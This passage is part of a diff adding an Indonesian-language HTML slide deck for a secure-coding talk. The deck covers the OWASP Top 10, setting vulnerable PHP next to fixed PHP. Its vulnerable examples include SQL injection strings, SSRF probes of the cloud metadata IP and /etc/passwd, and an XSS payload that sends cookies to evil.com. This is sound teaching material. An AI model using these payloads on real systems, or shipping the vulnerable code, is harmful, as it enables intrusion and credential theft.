+<span class="variable">$stmt</span> = <span class="variable">$conn</span>-><span class="function">prepare</span>(<span class="string">"... WHERE id = <span class="highlight-good">?</span>"</span>);
+                        </div>
+                    </div>
+                </div>
+                <div style="margin-top:16px;">
+                    <span class="card-tag tag-critical">IDOR</span>
+                    <span class="card-tag tag-critical">Privilege Escalation</span>
+                    <span class="card-tag tag-high">Missing Authorization</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 5: A02 CRYPTOGRAPHIC FAILURES      -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="5">
+            <div class="content-wrapper">
+                <span class="section-badge badge-a02">🟡 A02:2021 — Critical</span>
+                <h1 class="slide-title">Cryptographic <span class="gradient-text-fire">Failures</span></h1>
+                <p style="color:var(--text-secondary); margin-bottom:20px; font-size:16px;">
+                    Data sensitif tidak terlindungi dengan kriptografi yang kuat — password plaintext, hash lemah (MD5), data tanpa enkripsi.
+                </p>
+                <div class="code-comparison">
+                    <div class="code-block">
+                        <div class="code-block-header vulnerable">⚠️ RENTAN</div>
+                        <div class="code-content">
+<span class="comment">// Password plaintext & MD5</span>
+<span class="variable">$pass</span> = <span class="highlight-bad"><span class="string">"rahasia123"</span></span>;
+<span class="variable">$hash</span> = <span class="highlight-bad"><span class="function">md5</span></span>(<span class="variable">$pass</span>);
+<span class="comment">// MD5 bisa di-crack dalam hitungan detik!</span>
+<span class="comment">// Data sensitif tanpa enkripsi:</span>
+<span class="variable">$ktp</span> = <span class="highlight-bad"><span class="string">"3275012345678901"</span></span>;
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-block-header secure">✅ AMAN</div>
+                        <div class="code-content">
+<span class="comment">// Bcrypt + AES-256-GCM</span>
+<span class="variable">$hash</span> = <span class="highlight-good"><span class="function">password_hash</span></span>(
+  <span class="variable">$pass</span>, PASSWORD_BCRYPT, [<span class="string">'cost'</span>=><span class="string">12</span>]
+);
+<span class="comment">// Enkripsi data sensitif:</span>
+<span class="variable">$enc</span> = <span class="highlight-good"><span class="function">openssl_encrypt</span></span>(
+  <span class="variable">$ktp</span>, <span class="string">'aes-256-gcm'</span>, <span class="variable">$key</span>, ...
+);
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 6: A03 INJECTION                   -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="6">
+            <div class="content-wrapper">
+                <span class="section-badge badge-a03">🔴 A03:2021 — Critical</span>
+                <h1 class="slide-title">SQL <span class="gradient-text-fire">Injection</span></h1>
+                <p style="color:var(--text-secondary); margin-bottom:20px; font-size:16px;">
+                    Input user dimasukkan langsung ke query SQL — penyerang bisa membaca, mengubah, atau menghapus seluruh database.
+                </p>
+                <div class="code-comparison">
+                    <div class="code-block">
+                        <div class="code-block-header vulnerable">⚠️ RENTAN</div>
+                        <div class="code-content">
+<span class="comment">// Input langsung ke query!</span>
+<span class="variable">$search</span> = <span class="highlight-bad"><span class="variable">$_GET</span>[<span class="string">'search'</span>]</span>;
+<span class="variable">$query</span> = <span class="string">"SELECT * FROM products
+  WHERE name LIKE '<span class="highlight-bad">%$search%</span>'"</span>;
+
+<span class="comment">// Coba: ' OR '1'='1</span>
+<span class="comment">// Coba: ' UNION SELECT password
+//        FROM users-- -</span>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-block-header secure">✅ AMAN — Prepared Statement</div>
+                        <div class="code-content">
+<span class="comment">// Parameter terpisah dari query</span>
+<span class="variable">$stmt</span> = <span class="variable">$conn</span>-><span class="highlight-good"><span class="function">prepare</span></span>(
+  <span class="string">"SELECT * FROM products
+   WHERE name LIKE <span class="highlight-good">?</span>"</span>
+);
+<span class="variable">$stmt</span>-><span class="function">bind_param</span>(<span class="string">"s"</span>, <span class="variable">$search</span>);
+<span class="variable">$stmt</span>-><span class="function">execute</span>();
+<span class="comment">// Input tidak bisa mengubah struktur SQL!</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 7: A04 INSECURE DESIGN             -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="7">
+            <div class="content-wrapper">
+                <span class="section-badge badge-a04">🔵 A04:2021 — High</span>
+                <h1 class="slide-title">Insecure <span class="gradient-text-ocean">Design</span></h1>
+                <p style="color:var(--text-secondary); margin-bottom:20px; font-size:16px;">
+                    Kelemahan di level arsitektur/desain — bukan bug kode, tapi <strong>desain yang tidak memikirkan keamanan</strong>.
+                </p>
+                <div class="code-comparison">
+                    <div class="code-block">
+                        <div class="code-block-header vulnerable">⚠️ RENTAN — No Rate Limit</div>
+                        <div class="code-content">
+<span class="comment">// Reset password tanpa batasan</span>
+<span class="keyword">if</span> (<span class="variable">$answer</span> === <span class="variable">$security_answer</span>) {
+  <span class="comment">// ⚠️ Langsung tampilkan password!</span>
+  <span class="keyword">echo</span> <span class="highlight-bad"><span class="variable">$user</span>[<span class="string">'password'</span>]</span>;
+}
+<span class="comment">// ⚠️ Tidak ada rate limiting</span>
+<span class="comment">// ⚠️ Security question mudah ditebak</span>
+<span class="comment">// ⚠️ Tidak ada account lockout</span>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-block-header secure">✅ AMAN — Secure by Design</div>
+                        <div class="code-content">
+<span class="comment">// Rate limiting + token reset</span>
+<span class="keyword">if</span> (<span class="highlight-good"><span class="variable">$attempts</span> > MAX_ATTEMPTS</span>) {
+  <span class="variable">$lockout</span> = <span class="function">time</span>() + <span class="string">900</span>;
+  <span class="function">log_security_event</span>(<span class="string">'lockout'</span>);
+}
+<span class="comment">// ✅ Kirim reset link via email</span>
+<span class="variable">$token</span> = <span class="highlight-good"><span class="function">bin2hex</span>(<span class="function">random_bytes</span>(<span class="string">32</span>))</span>;
+<span class="function">sendResetEmail</span>(<span class="variable">$email</span>, <span class="variable">$token</span>);
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 8: A05 SECURITY MISCONFIGURATION   -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="8">
+            <div class="content-wrapper">
+                <span class="section-badge badge-a05">🟡 A05:2021 — High</span>
+                <h1 class="slide-title">Security <span class="gradient-text-fire">Misconfiguration</span></h1>
+                <p style="color:var(--text-secondary); margin-bottom:20px; font-size:16px;">
+                    Debug mode aktif di production, default credentials, phpinfo() terbuka, security headers tidak di-set.
+                </p>
+                <div class="grid-2">
+                    <div class="card">
+                        <div class="card-header"><span style="color:#ef4444; font-size:24px;">❌</span> <span class="card-title">Yang Salah</span></div>
+                        <ul class="impact-list danger">
+                            <li><code>display_errors = On</code> di production</li>
+                            <li>DB user: <code>root</code>, password: <em>(kosong)</em></li>
+                            <li><code>phpinfo()</code> bisa diakses publik</li>
+                            <li>Tidak ada security headers</li>
+                            <li>Default admin credentials aktif</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <div class="card-header"><span style="color:#10b981; font-size:24px;">✅</span> <span class="card-title">Best Practice</span></div>
+                        <ul class="impact-list success">
+                            <li><code>display_errors = Off</code>, <code>log_errors = On</code></li>
+                            <li>DB credentials dari env variable</li>
+                            <li>Hapus file default (readme, installer)</li>
+                            <li>Set CSP, HSTS, X-Frame-Options</li>
+                            <li>Ganti semua default credentials</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 9: A06 VULNERABLE COMPONENTS       -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="9">
+            <div class="content-wrapper">
+                <span class="section-badge badge-a06">🟡 A06:2021 — High</span>
+                <h1 class="slide-title">Vulnerable <span class="gradient-text-ocean">Components</span></h1>
+                <p style="color:var(--text-secondary); margin-bottom:20px; font-size:16px;">
+                    Menggunakan library, framework, atau runtime yang usang dan memiliki CVE (kerentanan yang dipublikasi).
+                </p>
+                <div class="grid-2">
+                    <div class="card">
+                        <div class="card-header"><span style="color:#ef4444; font-size:24px;">📦</span> <span class="card-title">Contoh CVE Berbahaya</span></div>
+                        <ul class="impact-list danger">
+                            <li>PHPMailer 5.2.21 → <strong>RCE</strong> (CVE-2016-10033)</li>
+                            <li>jQuery &lt; 3.5.0 → <strong>XSS</strong> (CVE-2020-11022)</li>
+                            <li>Log4j → <strong>RCE</strong> (CVE-2021-44228) 💥</li>
+                            <li>PHP &lt; 8.1 → End of Life, no patches</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <div class="card-header"><span style="color:#10b981; font-size:24px;">🔍</span> <span class="card-title">Pencegahan</span></div>
+                        <ul class="impact-list success">
+                            <li>Jalankan <code>composer audit</code> / <code>npm audit</code></li>
+                            <li>Gunakan Dependabot / Snyk di CI/CD</li>
+                            <li>SRI (Subresource Integrity) untuk CDN</li>
+                            <li>Update ke versi yang masih di-support</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 10: A07 AUTH FAILURES              -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="10">
+            <div class="content-wrapper">
+                <span class="section-badge badge-a07">🔴 A07:2021 — Critical</span>
+                <h1 class="slide-title">Authentication <span class="gradient-text-fire">Failures</span></h1>
+                <p style="color:var(--text-secondary); margin-bottom:20px; font-size:16px;">
+                    Session management lemah, brute-force tanpa batas, password lemah, tidak ada MFA.
+                </p>
+                <div class="code-comparison">
+                    <div class="code-block">
+                        <div class="code-block-header vulnerable">⚠️ RENTAN</div>
+                        <div class="code-content">
+<span class="comment">// Login tanpa proteksi</span>
+<span class="keyword">if</span> (<span class="variable">$pass</span> === <span class="highlight-bad"><span class="string">"admin123"</span></span>) {
+  <span class="variable">$_SESSION</span>[<span class="string">'user'</span>] = <span class="variable">$username</span>;
+  <span class="comment">// ⚠️ Session ID tidak di-regenerate</span>
+  <span class="comment">// ⚠️ Tidak ada rate limiting</span>
+  <span class="comment">// ⚠️ User enumeration</span>
+}
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-block-header secure">✅ AMAN</div>
+                        <div class="code-content">
+<span class="comment">// Bcrypt + session regeneration</span>
+<span class="keyword">if</span> (<span class="highlight-good"><span class="function">password_verify</span></span>(<span class="variable">$pass</span>, <span class="variable">$hash</span>)) {
+  <span class="highlight-good"><span class="function">session_regenerate_id</span></span>(<span class="keyword">true</span>);
+  <span class="variable">$_SESSION</span>[<span class="string">'login_time'</span>] = <span class="function">time</span>();
+  <span class="comment">// ✅ Rate limit: max 5 attempts</span>
+  <span class="comment">// ✅ Lockout: 15 min cooldown</span>
+  <span class="comment">// ✅ Generic error message</span>
+}
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 11: A08 DATA INTEGRITY             -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="11">
+            <div class="content-wrapper">
+                <span class="section-badge badge-a08">🟡 A08:2021 — High</span>
+                <h1 class="slide-title">Data Integrity <span class="gradient-text-ocean">Failures</span></h1>
+                <p style="color:var(--text-secondary); margin-bottom:20px; font-size:16px;">
+                    Insecure deserialization, cookie tanpa signature, software update tanpa verifikasi checksum.
+                </p>
+                <div class="code-comparison">
+                    <div class="code-block">
+                        <div class="code-block-header vulnerable">⚠️ RENTAN</div>
+                        <div class="code-content">
+<span class="comment">// Insecure deserialization → RCE!</span>
+<span class="variable">$data</span> = <span class="highlight-bad"><span class="function">unserialize</span></span>(<span class="variable">$_COOKIE</span>[<span class="string">'prefs'</span>]);
+<span class="comment">// __wakeup() / __destruct() dieksekusi!</span>
+
+<span class="comment">// Cookie tanpa verifikasi:</span>
+<span class="variable">$role</span> = <span class="highlight-bad"><span class="variable">$_COOKIE</span>[<span class="string">'role'</span>]</span>;
+<span class="comment">// Ubah role=user → role=admin!</span>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-block-header secure">✅ AMAN</div>
+                        <div class="code-content">
+<span class="comment">// Gunakan JSON + HMAC</span>
+<span class="variable">$data</span> = <span class="highlight-good"><span class="function">json_decode</span></span>(<span class="variable">$input</span>, <span class="keyword">true</span>);
+
+<span class="comment">// Cookie dengan signature:</span>
+<span class="variable">$sig</span> = <span class="highlight-good"><span class="function">hash_hmac</span></span>(<span class="string">'sha256'</span>, <span class="variable">$data</span>, <span class="variable">$key</span>);
+<span class="keyword">if</span> (!<span class="function">hash_equals</span>(<span class="variable">$expected</span>, <span class="variable">$sig</span>)) {
+  <span class="keyword">die</span>(<span class="string">"Tampering terdeteksi!"</span>);
+}
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 12: A09 LOGGING FAILURES           -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="12">
+            <div class="content-wrapper">
+                <span class="section-badge badge-a09">🔵 A09:2021 — High</span>
+                <h1 class="slide-title">Logging & Monitoring <span class="gradient-text-ocean">Failures</span></h1>
+                <p style="color:var(--text-secondary); margin-bottom:20px; font-size:16px;">
+                    Tanpa logging yang baik, breach baru terdeteksi setelah rata-rata <strong style="color:var(--accent-red);">277 hari</strong> (IBM Security Report).
+                </p>
+                <div class="grid-2">
+                    <div class="card">
+                        <div class="card-header"><span style="color:#ef4444; font-size:24px;">🔇</span> <span class="card-title">Yang HARUS Di-log</span></div>
+                        <ul class="impact-list danger">
+                            <li>Login berhasil & gagal (siapa, kapan, dari mana)</li>
+                            <li>Perubahan role/privilege</li>
+                            <li>Akses data sensitif</li>
+                            <li>Error dan exception</li>
+                            <li>Percobaan SQL Injection / XSS</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <div class="card-header"><span style="color:#10b981; font-size:24px;">🔔</span> <span class="card-title">Alert Rules</span></div>
+                        <ul class="impact-list success">
+                            <li>🚨 10+ login gagal dalam 5 menit</li>
+                            <li>🚨 SQL Injection pattern terdeteksi</li>
+                            <li>⚠️ Login dari IP/negara baru</li>
+                            <li>⚠️ Admin baru ditambahkan</li>
+                            <li>ℹ️ Data massal di-export</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 13: A10 SSRF                       -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="13">
+            <div class="content-wrapper">
+                <span class="section-badge badge-a10">🟡 A10:2021 — High</span>
+                <h1 class="slide-title"><span class="gradient-text-fire">SSRF</span> — Server-Side Request Forgery</h1>
+                <p style="color:var(--text-secondary); margin-bottom:20px; font-size:16px;">
+                    Penyerang membuat server melakukan request ke resource internal — bypass firewall, baca metadata cloud.
+                </p>
+                <div class="code-comparison">
+                    <div class="code-block">
+                        <div class="code-block-header vulnerable">⚠️ RENTAN</div>
+                        <div class="code-content">
+<span class="comment">// Server fetch URL apa pun dari user</span>
+<span class="variable">$url</span> = <span class="highlight-bad"><span class="variable">$_POST</span>[<span class="string">'url'</span>]</span>;
+<span class="variable">$content</span> = <span class="function">file_get_contents</span>(<span class="variable">$url</span>);
+
+<span class="comment">// Coba: http://169.254.169.254/</span>
+<span class="comment">//   → Baca AWS IAM credentials!</span>
+<span class="comment">// Coba: file:///etc/passwd</span>
+<span class="comment">//   → Baca file lokal server!</span>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-block-header secure">✅ AMAN</div>
+                        <div class="code-content">
+<span class="comment">// Whitelist + IP validation</span>
+<span class="variable">$allowed</span> = [<span class="string">'example.com'</span>];
+<span class="variable">$parsed</span> = <span class="function">parse_url</span>(<span class="variable">$url</span>);
+<span class="keyword">if</span> (!<span class="function">in_array</span>(<span class="variable">$parsed</span>[<span class="string">'host'</span>], <span class="variable">$allowed</span>))
+  <span class="keyword">die</span>(<span class="string">"Domain tidak diizinkan"</span>);
+<span class="comment">// ✅ Block internal IPs (RFC 1918)</span>
+<span class="comment">// ✅ Only allow HTTP/HTTPS protocol</span>
+<span class="comment">// ✅ No redirect following</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 14: BONUS XSS                      -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="14">
+            <div class="content-wrapper">
+                <span class="section-badge badge-bonus">🟣 BONUS — XSS</span>
+                <h1 class="slide-title">Cross-Site <span class="gradient-text">Scripting</span> (XSS)</h1>
+                <p style="color:var(--text-secondary); margin-bottom:20px; font-size:16px;">
+                    Script berbahaya diinjeksikan ke halaman web — bisa mencuri cookie, session, atau memasang keylogger.
+                </p>
+                <div class="code-comparison">
+                    <div class="code-block">
+                        <div class="code-block-header vulnerable">⚠️ RENTAN — Reflected & Stored</div>
+                        <div class="code-content">
+<span class="comment">// Reflected: input langsung di-echo</span>
+<span class="keyword">echo</span> <span class="string">"Hasil: <span class="highlight-bad">"</span> . <span class="variable">$_GET</span>[<span class="string">'q'</span>]</span>;
+
+<span class="comment">// Stored: komentar dari DB tanpa encode</span>
+<span class="keyword">echo</span> <span class="highlight-bad"><span class="variable">$row</span>[<span class="string">'comment'</span>]</span>;
+
+<span class="comment">// Payload: &lt;script&gt;
+//   fetch('http://evil.com?c='
+//   +document.cookie)&lt;/script&gt;</span>
+                        </div>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-block-header secure">✅ AMAN — Output Encoding + CSP</div>
+                        <div class="code-content">
+<span class="comment">// Encode semua output</span>
+<span class="keyword">echo</span> <span class="highlight-good"><span class="function">htmlspecialchars</span></span>(
+  <span class="variable">$input</span>, ENT_QUOTES, <span class="string">'UTF-8'</span>
+);
+
+<span class="comment">// Content-Security-Policy header:</span>
+<span class="function">header</span>(<span class="string">"<span class="highlight-good">Content-Security-Policy:</span>
+  default-src 'self';
+  script-src 'self';"</span>);
+<span class="comment">// Browser MENOLAK inline script!</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 15: CHEAT SHEET                    -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="15">
+            <div class="content-wrapper">
+                <h1 class="slide-title" style="text-align:center;">📋 Cheat Sheet — <span class="gradient-text-emerald">Quick Reference</span></h1>
+                <div style="overflow-x:auto; margin-top:16px;">
+                    <table class="cheat-table">
+                        <thead>
+                            <tr>
+                                <th>OWASP</th>
+                                <th>Ancaman</th>
+                                <th>Pencegahan Utama</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td><strong>A01</strong></td><td>Broken Access Control</td><td><code>Authorization check</code> + RBAC + Prepared Statement</td></tr>
+                            <tr><td><strong>A02</strong></td><td>Cryptographic Failures</td><td><code>password_hash()</code> + AES-256-GCM + HTTPS</td></tr>
+                            <tr><td><strong>A03</strong></td><td>Injection</td><td><code>Prepared Statement</code> + Input Validation</td></tr>
+                            <tr><td><strong>A04</strong></td><td>Insecure Design</td><td>Rate Limiting + Token-based Reset + Threat Modeling</td></tr>
+                            <tr><td><strong>A05</strong></td><td>Security Misconfiguration</td><td>Security Headers + <code>display_errors=Off</code> + Env Vars</td></tr>
+                            <tr><td><strong>A06</strong></td><td>Vulnerable Components</td><td><code>composer audit</code> + Dependabot + SRI</td></tr>
+                            <tr><td><strong>A07</strong></td><td>Auth Failures</td><td>Bcrypt + <code>session_regenerate_id()</code> + MFA</td></tr>
+                            <tr><td><strong>A08</strong></td><td>Data Integrity Failures</td><td>JSON (bukan serialize) + <code>hash_hmac()</code> + Checksum</td></tr>
+                            <tr><td><strong>A09</strong></td><td>Logging Failures</td><td>Structured Logging + Audit Trail + Alert Rules</td></tr>
+                            <tr><td><strong>A10</strong></td><td>SSRF</td><td>Domain Whitelist + IP Validation + Protocol Filter</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 16: BEST PRACTICES                 -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="16">
+            <div class="content-wrapper">
+                <h1 class="slide-title" style="text-align:center;">🛡️ Secure Coding <span class="gradient-text-emerald">Best Practices</span></h1>
+                <div class="grid-3" style="margin-top:20px;">
+                    <div class="card" style="text-align:center;">
+                        <div style="font-size:36px;margin-bottom:10px;">🔐</div>
+                        <div class="card-title" style="margin-bottom:6px;">Defense in Depth</div>
+                        <p style="color:var(--text-secondary);font-size:13px;">Jangan bergantung pada satu lapisan keamanan. Terapkan validasi di setiap layer.</p>
+                    </div>
+                    <div class="card" style="text-align:center;">
+                        <div style="font-size:36px;margin-bottom:10px;">🚫</div>
+                        <div class="card-title" style="margin-bottom:6px;">Never Trust Input</div>
+                        <p style="color:var(--text-secondary);font-size:13px;">Validasi dan sanitasi SEMUA input — dari user, API, file, database, bahkan internal.</p>
+                    </div>
+                    <div class="card" style="text-align:center;">
+                        <div style="font-size:36px;margin-bottom:10px;">📝</div>
+                        <div class="card-title" style="margin-bottom:6px;">Log Everything</div>
+                        <p style="color:var(--text-secondary);font-size:13px;">Log semua aktivitas keamanan. Tanpa logging, breach tidak bisa dideteksi.</p>
+                    </div>
+                    <div class="card" style="text-align:center;">
+                        <div style="font-size:36px;margin-bottom:10px;">⬅️</div>
+                        <div class="card-title" style="margin-bottom:6px;">Shift Left Security</div>
+                        <p style="color:var(--text-secondary);font-size:13px;">Integrasikan security sejak awal SDLC, bukan di akhir deployment.</p>
+                    </div>
+                    <div class="card" style="text-align:center;">
+                        <div style="font-size:36px;margin-bottom:10px;">🔄</div>
+                        <div class="card-title" style="margin-bottom:6px;">Keep Updated</div>
+                        <p style="color:var(--text-secondary);font-size:13px;">Update dependency secara rutin. Audit CVE setiap minggu di CI/CD pipeline.</p>
+                    </div>
+                    <div class="card" style="text-align:center;">
+                        <div style="font-size:36px;margin-bottom:10px;">🧪</div>
+                        <div class="card-title" style="margin-bottom:6px;">Test Security</div>
+                        <p style="color:var(--text-secondary);font-size:13px;">SAST, DAST, pentest rutin. Gunakan OWASP ZAP atau Burp Suite.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 17: Q&A                            -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="17">
+            <div style="text-align:center;">
+                <div style="font-size:80px; margin-bottom:24px;">💬</div>
+                <h1 class="slide-title"><span class="gradient-text">Diskusi</span> & Tanya Jawab</h1>
+                <p class="slide-subtitle">
+                    Ada pertanyaan? Mari diskusi tentang keamanan aplikasi web, secure coding, atau karier di cybersecurity!
+                </p>
+                <div style="display:flex; gap:16px; justify-content:center; flex-wrap:wrap; margin-top:20px;">
+                    <div style="background:var(--bg-card); padding:16px 24px; border-radius:var(--radius); border:1px solid rgba(255,255,255,0.06);">
+                        <div style="font-size:24px; margin-bottom:6px;">🎯</div>
+                        <span style="font-size:14px; color:var(--text-secondary);">Bagaimana mulai belajar security?</span>
+                    </div>
+                    <div style="background:var(--bg-card); padding:16px 24px; border-radius:var(--radius); border:1px solid rgba(255,255,255,0.06);">
+                        <div style="font-size:24px; margin-bottom:6px;">💼</div>
+                        <span style="font-size:14px; color:var(--text-secondary);">Karier di cybersecurity?</span>
+                    </div>
+                    <div style="background:var(--bg-card); padding:16px 24px; border-radius:var(--radius); border:1px solid rgba(255,255,255,0.06);">
+                        <div style="font-size:24px; margin-bottom:6px;">🛠️</div>
+                        <span style="font-size:14px; color:var(--text-secondary);">Tools security favorit?</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================== -->
+        <!-- SLIDE 18: PENUTUP                        -->
+        <!-- ======================================== -->
+        <div class="slide" data-slide="18">
+            <div style="text-align:center;">
+                <div class="cover-badge">🏛️ HIMTIF UNIVERSITAS PAMULANG</div>
+                <h1 class="cover-title" style="font-size:clamp(28px,5vw,56px);">
+                    <span class="gradient-text">Terima Kasih!</span>
+                </h1>
+                <p class="cover-subtitle" style="margin-bottom:32px;">
+                    Ingat: <strong>keamanan dimulai dari baris pertama kode yang kita tulis.</strong><br>
+                    Jadilah developer yang tidak hanya bisa membuat, tapi juga bisa melindungi.
+                </p>
+                <div style="display:flex; gap:12px; justify-content:center; flex-wrap:wrap; margin-bottom:28px;">
+                    <span class="law-ref" style="background:rgba(0,240,255,0.15); color:var(--accent-cyan);">🔐 Hack Responsibly</span>
+                    <span class="law-ref" style="background:rgba(16,185,129,0.15); color:var(--accent-green);">📚 Learn Ethically</span>
+                    <span class="law-ref" style="background:rgba(139,92,246,0.15); color:var(--accent-purple);">💻 Code Securely</span>
+                </div>
+                <p class="cover-meta">
+                    <strong style="color:var(--accent-cyan);">CYBERSHIELD 2026</strong><br>
+                    "From Code to Secure: Memahami Pengembangan dan Keamanan Produk Digital di Industri TI"
+                </p>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Navigation controls -->
+    <div class="nav-controls" style="display: flex; align-items: center; gap: 8px;">
+        <button class="nav-btn" id="prevBtn" onclick="prevSlide()" disabled>←</button>
+        <span class="slide-counter" id="slideCounter">1 / 19</span>
+        <button class="nav-btn" id="nextBtn" onclick="nextSlide()">→</button>
+        <a href="Animasi/index.html" target="_blank" class="fullscreen-btn" title="Animasi Kerentanan" style="text-decoration:none; display:flex; align-items:center; justify-content:center; margin-left: 10px;">▶</a>
+        <button class="fullscreen-btn" onclick="toggleFullscreen()" title="Fullscreen (F)">⛶</button>
+    </div>
+
+    <script>
+        // ========================================
+        // PRESENTATION ENGINE
+        // ========================================
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.slide');
+        const totalSlides = slides.length;
+        const progressBar = document.getElementById('progressBar');
+        const slideCounter = document.getElementById('slideCounter');
+        const prevBtn = document.getElementById('prevBtn');
+        const nextBtn = document.getElementById('nextBtn');
+        const keyboardHint = document.getElementById('keyboardHint');
+
+        // Show keyboard hint briefly
+        keyboardHint.classList.add('visible');
+        setTimeout(() => keyboardHint.classList.remove('visible'), 5000);
+
+        function updateSlide() {
+            slides.forEach((slide, index) => {
+                slide.classList.remove('active', 'prev');
+                if (index === currentSlide) {
+                    slide.classList.add('active');
+                } else if (index < currentSlide) {
+                    slide.classList.add('prev');
+                }
+            });
+
+            // Update progress bar
+            const progress = ((currentSlide + 1) / totalSlides) * 100;
+            progressBar.style.width = progress + '%';
+
+            // Update counter
+            slideCounter.textContent = `${currentSlide + 1} / ${totalSlides}`;
+
+            // Update nav buttons
+            prevBtn.disabled = currentSlide === 0;
+            nextBtn.disabled = currentSlide === totalSlides - 1;
+        }
+
+        function nextSlide() {
+            if (currentSlide < totalSlides - 1) {
+                currentSlide++;
+                updateSlide();
+            }
+        }
+
+        function prevSlide() {
+            if (currentSlide > 0) {
+                currentSlide--;
+                updateSlide();
+            }
+        }
+
+        function goToSlide(index) {
+            if (index >= 0 && index < totalSlides) {
+                currentSlide = index;
+                updateSlide();
+            }
+        }
+
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            } else {
+                document.exitFullscreen().catch(() => {});
+            }
+        }
+
+        // Keyboard navigation
+        document.addEventListener('keydown', (e) => {
+            switch (e.key) {
+                case 'ArrowRight':
+                case 'ArrowDown':
+                case ' ':
+                    e.preventDefault();
+                    nextSlide();
+                    break;
+                case 'ArrowLeft':
+                case 'ArrowUp':
+                    e.preventDefault();
+                    prevSlide();
+                    break;
+                case 'Home':
+                    e.preventDefault();
+                    goToSlide(0);
+                    break;
+                case 'End':
+                    e.preventDefault();
+                    goToSlide(totalSlides - 1);
+                    break;
+                case 'f':
+                case 'F':
+                    if (!e.ctrlKey && !e.metaKey) {
+                        e.preventDefault();
+                        toggleFullscreen();
+                    }
+                    break;
+                case 'Escape':
+                    if (document.fullscreenElement) {
+                        document.exitFullscreen();
+                    }
+                    break;
+            }
+        });
+
+        // Touch/swipe support for mobile
+        let touchStartX = 0;
+        let touchEndX = 0;
+
+        document.addEventListener('touchstart', (e) => {
+            touchStartX = e.changedTouches[0].screenX;
+        }, { passive: true });
+
+        document.addEventListener('touchend', (e) => {
+            touchEndX = e.changedTouches[0].screenX;
+            const diff = touchStartX - touchEndX;
+            if (Math.abs(diff) > 50) {
+                if (diff > 0) nextSlide();
+                else prevSlide();
+            }
+        }, { passive: true });
+
+        // Initialize
+        updateSlide();
+    </script>
+</body>
+</html>
